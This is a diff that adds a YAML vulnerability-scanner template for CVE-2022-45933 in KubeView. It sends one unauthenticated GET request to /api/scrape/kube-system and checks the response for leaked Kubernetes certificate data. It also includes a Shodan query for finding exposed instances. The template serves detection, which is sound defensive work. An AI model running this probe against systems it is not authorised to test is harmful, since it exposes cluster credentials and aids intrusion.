@@ -1,0 +1,23 @@
+id: poc-yaml-kubeview-command-injection
+info:
+  name: KubeView 命令注入漏洞(CVE-2022-45933)
+  severity: critical
+  tags:
+  - CVE-2022-45933
+  - 命令注入
+  finger: kubeview
+  shodan: http.title:"KubeView"
+requests:
+- method: GET
+  path: /api/scrape/kube-system
+  expression: 'status_code == 200
+
+    && contains(body,"BEGIN CERTIFICATE")
+
+    && contains(body,"END CERTIFICATE")
+
+    && contains(body,"kubernetes.io")
+
+    '
+variables: {}
+transport: http
